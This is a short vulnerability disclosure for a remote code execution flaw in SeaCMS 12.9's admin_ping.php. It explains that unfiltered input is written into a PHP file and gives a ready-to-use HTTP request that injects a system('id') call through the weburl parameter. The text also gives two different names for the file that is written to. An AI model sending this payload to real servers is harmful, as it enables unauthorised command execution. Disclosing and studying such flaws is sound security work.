# Introduction

SeaCMS is a free, open-source website content management system written in PHP. The system is mainly designed to manage video-on-demand resources. **

SeaCMS 12.9 version has a remote code execution vulnerability. The vulnerability is caused by admin_ping.php directly splicing and writing the user input data into ping.php without processing it, which allows authenticated attackers to exploit the vulnerability to execute arbitrary commands and obtain system permissions. 

# Environment

[https://github.com/seacms-net/CMS/blob/master/SeaCMS_12.9_%E6%B5%B7%E6%B4%8BCMS%E5%AE%89%E8%A3%85%E5%8C%85.zip](https://github.com/seacms-net/CMS/blob/master/SeaCMS_12.9_%E6%B5%B7%E6%B4%8BCMS%E5%AE%89%E8%A3%85%E5%8C%85.zip)

# Analysis

![](https://cdn.nlark.com/yuque/0/2024/png/22914233/1718258413454-4421ea91-f5fa-4283-acc9-74a0d98d502e.png)

The weburl and token passed in to admin_ping.php are not filtered, but directly concatenated and written into the admin_ping.php file, resulting in arbitrary code execution.

# Verify

![](https://cdn.nlark.com/yuque/0/2024/png/22914233/1718258573754-e21fcc4b-470b-41fe-acc0-25afd3f7ff5a.png)

```http
POST /xotry/admin_ping.php?action=set HTTP/1.1
Host: 192.168.126.128:8082
Cookie: PHPSESSID=8iuqqnar4ucddeqlp52sdmpbov
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

weburl=1";system('id');//&token=1
```

![](https://cdn.nlark.com/yuque/0/2024/png/22914233/1718258589599-76d3041f-c5b2-4606-844c-63f355eff0d0.png)

Access /data/admin/ping.php and execute the command successfully
